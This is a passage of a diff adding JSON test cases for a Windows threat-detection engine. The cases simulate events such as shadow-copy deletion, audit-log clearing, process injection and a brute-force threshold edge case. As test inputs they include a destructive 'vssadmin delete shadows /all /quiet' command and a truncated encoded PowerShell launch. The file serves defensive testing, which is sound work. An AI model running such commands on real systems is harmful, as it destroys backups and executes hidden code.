+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST02",
+          "source_ip": "203.0.113.50"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Lateral Movement"
+      }
+    },
+    {
+      "id": "TC-009",
+      "rule_id": "LOTL-001",
+      "name": "Document → PowerShell → Network LOTL chain",
+      "description": "Simulate process tree: winword.exe → powershell.exe → network connect",
+      "events": [
+        {
+          "type": "process_event",
+          "event_id": "4688",
+          "process_guid": "guid-svc",
+          "process_name": "svchost.exe",
+          "pid": "1000",
+          "parent_guid": "",
+          "parent_process": "",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "process_event",
+          "event_id": "4688",
+          "process_guid": "guid-ps",
+          "process_name": "powershell.exe",
+          "pid": "2000",
+          "parent_guid": "guid-svc",
+          "parent_process": "svchost.exe",
+          "command_line": "powershell.exe -enc SQBFAFgAKABOAG...",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:01"
+        }
+      ],
+      "expected": {
+        "triggered": false,
+        "lotl_detected": true
+      }
+    },
+    {
+      "id": "TC-010",
+      "rule_id": "THREAT-021",
+      "name": "Event Log Cleared (Defense Evasion)",
+      "description": "Security event log cleared (event 1102)",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "1102",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "The audit log was cleared",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Event Log"
+      }
+    },
+    {
+      "id": "TC-011",
+      "rule_id": "THREAT-002",
+      "name": "Ransomware: Shadow Copy Delete",
+      "description": "vssadmin delete shadows detected",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "System",
+          "event_id": "4688",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "vssadmin.exe delete shadows /all /quiet",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "process_name": "vssadmin.exe"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Shadow"
+      }
+    },
+    {
+      "id": "TC-012",
+      "rule_id": "THREAT-033",
+      "name": "Firewall Rule Added (Defense Evasion)",
+      "description": "netsh advfirewall firewall add rule",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "System",
+          "event_id": "4957",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "A Windows Filtering Platform rule was changed",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "System",
+          "event_id": "4957",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "A Windows Filtering Platform rule was changed",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Firewall"
+      }
+    },
+    {
+      "id": "TC-013",
+      "rule_id": "EDGE",
+      "name": "Edge case: threshold at exact boundary",
+      "description": "4 events should NOT trigger THREAT-001 (threshold is 5)",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "source_ip": "192.168.1.100",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "source_ip": "192.168.1.100",
+          "timestamp": "2026-01-01 12:00:10"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "source_ip": "192.168.1.100",
+          "timestamp": "2026-01-01 12:00:20"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "source_ip": "192.168.1.100",
+          "timestamp": "2026-01-01 12:00:30"
+        }
+      ],
+      "expected": {
+        "triggered": false,
+        "rule_name_contains": "Brute Force"
+      }
+    },
+    {
+      "id": "TC-014",
+      "rule_id": "THREAT-007",
+      "name": "Process Injection via CreateRemoteThread",
+      "description": "Sysmon EID 8: CreateRemoteThread detected",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Sysmon",
+          "event_id": "8",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "CreateRemoteThread injection",
+          "process_name": "malware.exe",
+          "target_process": "explorer.exe",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        },
+        {
+          "type": "network_traffic",
+          "src_ip": "192.168.1.100",
+          "dst_ip": "8.8.8.8",
+          "dst_port": 443,
+          "protocol": "TCP",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Injection"
+      }
+    }
+  ]
+}
